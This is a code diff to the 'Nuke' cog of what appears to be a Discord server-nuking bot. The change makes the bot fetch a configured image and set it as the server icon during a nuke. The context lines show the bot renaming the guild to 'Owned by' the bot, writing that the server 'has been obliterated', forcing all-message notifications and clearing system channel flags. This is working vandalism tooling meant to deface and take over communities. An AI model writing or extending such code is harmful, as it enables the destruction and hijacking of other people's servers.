@@ -2,8 +2,8 @@ import asyncio
 from datetime import timedelta
 from discord.ext import commands
 import discord
-from core.core import Nuker
-from core.config import NAME
+from core.core import Nuker, _fetch_icon
+from core.config import NAME, NUKE_IMG
 from core.managers.nukelogger import log_nuke
 from core.managers.usertypes import blacklisted_command, _db
 from cogs.nukeconfig import get_user_nuke_config
@@ -37,9 +37,12 @@ class Nuke(commands.Cog):
         server_name = user_config.get("server_name") or f"📢 Void property"
         server_desc = user_config.get("server_description") or f'This place has been obliterated by {NAME}. Join now if you want a bot like this.'
 
+        icon_data = await _fetch_icon(NUKE_IMG)
+
         await ctx.guild.edit(
             name=server_name,
             description=server_desc,
+            icon=icon_data,
             community=False,
             default_notifications=discord.NotificationLevel.all_messages,
             system_channel_flags=discord.SystemChannelFlags._from_value(0),
@@ -126,9 +129,12 @@ class Nuke(commands.Cog):
         server_name = user_config.get("server_name") or f"Owned by {NAME}"
         server_desc = user_config.get("server_description") or f'This place has been obliterated by {NAME}. Join now if you want a bot like this.'
 
+        icon_data = await _fetch_icon(NUKE_IMG)
+
         await ctx.guild.edit(
             name=server_name,
             description=server_desc,
+            icon=icon_data,
             community=False,
             default_notifications=discord.NotificationLevel.all_messages,
             system_channel_flags=discord.SystemChannelFlags._from_value(0),
